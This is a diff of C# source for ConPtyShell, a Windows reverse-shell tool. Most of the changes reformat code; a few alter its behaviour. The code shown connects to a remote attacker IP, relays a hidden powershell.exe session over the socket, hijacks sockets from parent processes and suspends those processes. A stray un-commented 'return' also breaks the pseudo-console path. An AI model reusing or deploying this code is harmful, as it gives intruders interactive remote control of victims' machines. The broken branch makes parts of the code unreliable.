@@ -937,14 +1125,14 @@ public static class ConPtyShell
         {
             throw new ConPtyShellException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
         }
-        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero,IntPtr.Zero);
+        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
         if (!success)
         {
             throw new ConPtyShellException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
         }
         return startupInfo;
     }
-    
+
     private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
     {
         PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
@@ -960,69 +1148,75 @@ public static class ConPtyShell
         }
         return pInfo;
     }
-    
-    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine){
-        STARTUPINFOEX startupInfo =  ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
+
+    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine)
+    {
+        STARTUPINFOEX startupInfo = ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
         PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);
         return processInfo;
     }
-        
+
     private static void ThreadReadPipeWriteSocket(object threadParams)
     {
-        object[] threadParameters = (object[]) threadParams;
+        object[] threadParameters = (object[])threadParams;
         IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
         IntPtr shellSocket = (IntPtr)threadParameters[1];
-        int bufferSize=256;
+        int bufferSize = 256;
         bool readSuccess = false;
         Int32 bytesSent = 0;
-        uint dwBytesRead=0;
-        do{
+        uint dwBytesRead = 0;
+        do
+        {
             byte[] bytesToWrite = new byte[bufferSize];
             readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
             bytesSent = send(shellSocket, bytesToWrite, bufferSize, 0);
         } while (bytesSent > 0 && readSuccess);
         Console.WriteLine("debug: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
     }
-    
-    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket){
+
+    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket)
+    {
         object[] threadParameters = new object[2];
-        threadParameters[0]=OutputPipeRead;
-        threadParameters[1]=shellSocket;
+        threadParameters[0] = OutputPipeRead;
+        threadParameters[1] = shellSocket;
         Thread thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocket);
         thThreadReadPipeWriteSocket.Start(threadParameters);
         return thThreadReadPipeWriteSocket;
     }
-    
+
     private static void ThreadReadSocketWritePipe(object threadParams)
     {
-        object[] threadParameters = (object[]) threadParams;
+        object[] threadParameters = (object[])threadParams;
         IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
         IntPtr shellSocket = (IntPtr)threadParameters[1];
         IntPtr hChildProcess = (IntPtr)threadParameters[2];
-        int bufferSize=256;
+        int bufferSize = 256;
         bool writeSuccess = false;
         Int32 nBytesReceived = 0;
         uint bytesWritten = 0;
-        do{
+        do
+        {
             byte[] bytesReceived = new byte[bufferSize];
             nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
-            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);	
+            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
         } while (nBytesReceived > 0 && writeSuccess);
         Console.WriteLine("debug: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
         TerminateProcess(hChildProcess, 0);
     }
-    
-    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shellSocket, IntPtr hChildProcess){
+
+    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shellSocket, IntPtr hChildProcess)
+    {
         object[] threadParameters = new object[3];
-        threadParameters[0]=InputPipeWrite;
-        threadParameters[1]=shellSocket;
-        threadParameters[2]=hChildProcess;
+        threadParameters[0] = InputPipeWrite;
+        threadParameters[1] = shellSocket;
+        threadParameters[2] = hChildProcess;
         Thread thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipe);
         thReadSocketWritePipe.Start(threadParameters);
         return thReadSocketWritePipe;
     }
-    
-    public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell){
+
+    public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
+    {
         IntPtr shellSocket = IntPtr.Zero;
         IntPtr InputPipeRead = IntPtr.Zero;
         IntPtr InputPipeWrite = IntPtr.Zero;
@@ -1040,10 +1234,10 @@ public static class ConPtyShell
         Process currentProcess = null;
         Process parentProcess = null;
         Process grandParentProcess = null;
-        
-        if(GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
+
+        if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
             conptyCompatible = true;
-        
+
         PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
         CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
         // comment the below function to debug errors
@@ -1051,64 +1245,73 @@ public static class ConPtyShell
         // init wsastartup stuff for this thread
         InitWSAThread();
 
-        if (conptyCompatible){
+        if (conptyCompatible)
+        {
             Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
-            if(upgradeShell){
+            if (upgradeShell)
+            {
                 List<IntPtr> socketsHandles = new List<IntPtr>();
                 currentProcess = Process.GetCurrentProcess();
                 parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
-                if (parentProcess != null)  grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
+                if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
                 // try to duplicate the socket for the current process
                 shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess);
-                if (shellSocket != IntPtr.Zero){
-                    if(parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
+                if (shellSocket != IntPtr.Zero)
+                {
+                    if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
                 }
                 else
                     // if no sockets are found in the current process we try to hijack our current parent process socket
                     shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess);
-                if(shellSocket == IntPtr.Zero)
+                if (shellSocket == IntPtr.Zero)
                     throw new ConPtyShellException("No \\Device\\Afd objects found. Socket duplication failed.");
                 if (grandParentProcess != null)
                     grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
             }
-            else{
+            else
+            {
                 shellSocket = connectRemote(remoteIp, remotePort);
-                if(shellSocket == IntPtr.Zero){            
+                if (shellSocket == IntPtr.Zero)
+                {
                     output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
                     return output;
                 }
                 TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
             }
-            if(GetConsoleWindow() == IntPtr.Zero){
+            if (GetConsoleWindow() == IntPtr.Zero)
+            {
                 AllocConsole();
                 ShowWindow(GetConsoleWindow(), SW_HIDE);
                 newConsoleAllocated = true;
             }
-            // Console.WriteLine("debug: Creating pseudo console...");
-            // return "";
+            Console.WriteLine("debug: Creating pseudo console...");
+            return "";
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
-            if(pseudoConsoleCreationResult != 0)
+            if (pseudoConsoleCreationResult != 0)
             {
                 output += string.Format("{0}Could not create psuedo console. Error Code {1}", errorString, pseudoConsoleCreationResult.ToString());
                 return output;
             }
             childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
         }
-        else{
-            if(upgradeShell){
+        else
+        {
+            if (upgradeShell)
+            {
                 output += string.Format("Could not upgrade shell to fully interactive because ConPTY is not compatible on this system");
                 return output;
             }
             shellSocket = connectRemote(remoteIp, remotePort);
-            if(shellSocket == IntPtr.Zero){            
+            if (shellSocket == IntPtr.Zero)
+            {
                 output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
                 return output;
             }
             Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
             STARTUPINFO sInfo = new STARTUPINFO();
             sInfo.cb = Marshal.SizeOf(sInfo);
-            sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES; 
-            sInfo.hStdInput = InputPipeRead;       
+            sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
+            sInfo.hStdInput = InputPipeRead;
             sInfo.hStdOutput = OutputPipeWrite;
             sInfo.hStdError = OutputPipeWrite;
             CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
@@ -1122,17 +1325,17 @@ public static class ConPtyShell
         Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket);
         Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess);
         // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
-        if(upgradeShell && parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
-        if(upgradeShell && grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
+        if (upgradeShell && parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
+        if (upgradeShell && grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
         WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
         //cleanup everything
-        if(upgradeShell && parentSocketInherited) NtResumeProcess(parentProcess.Handle);
-        if(upgradeShell && grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
+        if (upgradeShell && parentSocketInherited) NtResumeProcess(parentProcess.Handle);
+        if (upgradeShell && grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
         thThreadReadPipeWriteSocket.Abort();
         thReadSocketWritePipe.Abort();
         closesocket(shellSocket);
         RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
-        if(newConsoleAllocated)
+        if (newConsoleAllocated)
             FreeConsole();
         CloseHandle(childProcessInfo.hThread);
         CloseHandle(childProcessInfo.hProcess);
@@ -1144,7 +1347,8 @@ public static class ConPtyShell
     }
 }
 
-public static class ConPtyShellMainClass{
+public static class ConPtyShellMainClass
+{
     private static string help = @"
 
 ConPtyShell - Fully Interactive Reverse Shell for Windows 
@@ -1195,87 +1399,102 @@ Examples:
         ConPtyShell.exe upgrade shell 30 90
         
 ";
-    
+
     private static bool HelpRequired(string param)
     {
         return param == "-h" || param == "--help" || param == "/?";
     }
-    
+
     private static void CheckArgs(string[] arguments)
     {
-        if(arguments.Length < 2)
+        if (arguments.Length < 2)
             throw new ConPtyShellException("\r\nConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
     }
-    
+
     private static void DisplayHelp()
     {
         Console.Out.Write(help);
     }
-    
-    private static string CheckRemoteIpArg(string ipString){
+
+    private static string CheckRemoteIpArg(string ipString)
+    {
         IPAddress address;
         if (!IPAddress.TryParse(ipString, out address))
             throw new ConPtyShellException("\r\nConPtyShell: Invalid remoteIp value" + ipString);
         return ipString;
     }
-    
-    private static int CheckInt(string arg){
+
+    private static int CheckInt(string arg)
+    {
         int ret = 0;
         if (!Int32.TryParse(arg, out ret))
             throw new ConPtyShellException("\r\nConPtyShell: Invalid integer value " + arg);
         return ret;
     }
-    
-    private static uint ParseRows(string[] arguments){
+
+    private static uint ParseRows(string[] arguments)
+    {
         uint rows = 24;
         if (arguments.Length > 2)
             rows = (uint)CheckInt(arguments[2]);
         return rows;
     }
-    
-    private static uint ParseCols(string[] arguments){
+
+    private static uint ParseCols(string[] arguments)
+    {
         uint cols = 80;
         if (arguments.Length > 3)
             cols = (uint)CheckInt(arguments[3]);
         return cols;
     }
 
-    private static string ParseCommandLine(string[] arguments){
+    private static string ParseCommandLine(string[] arguments)
+    {
         string commandLine = "powershell.exe";
         if (arguments.Length > 4)
             commandLine = arguments[4];
         return commandLine;
     }
 
-    public static string ConPtyShellMain(string[] args){
-        string output="";
+    public static string ConPtyShellMain(string[] args)
+    {
+        string output = "";
         if (args.Length == 1 && HelpRequired(args[0]))
         {
             DisplayHelp();
         }
         else
         {
-            CheckArgs(args);
-            string remoteIp = "";
-            int remotePort = 0;
-            bool upgradeShell = false;
-            if(args[0].Contains("upgrade"))
-                upgradeShell = true;
-            else{
-                remoteIp = CheckRemoteIpArg(args[0]);
-                remotePort = CheckInt(args[1]);
+            try
+            {
+                CheckArgs(args);
+                string remoteIp = "";
+                int remotePort = 0;
+                bool upgradeShell = false;
+                if (args[0].Contains("upgrade"))
+                    upgradeShell = true;
+                else
+                {
+                    remoteIp = CheckRemoteIpArg(args[0]);
+                    remotePort = CheckInt(args[1]);
+                }
+                uint rows = ParseRows(args);
+                uint cols = ParseCols(args);
+                string commandLine = ParseCommandLine(args);
+                output = ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
             }
-            uint rows = ParseRows(args);
-            uint cols = ParseCols(args);
-            string commandLine = ParseCommandLine(args);
-            output=ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
+            catch (Exception e)
+            {
+                Console.WriteLine("\n" + e.ToString() + "\n");
+            }
         }
         return output;
     }
 }
 
 
-class MainClass{
+class MainClass
+{
     static void Main(string[] args)
     {
         Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
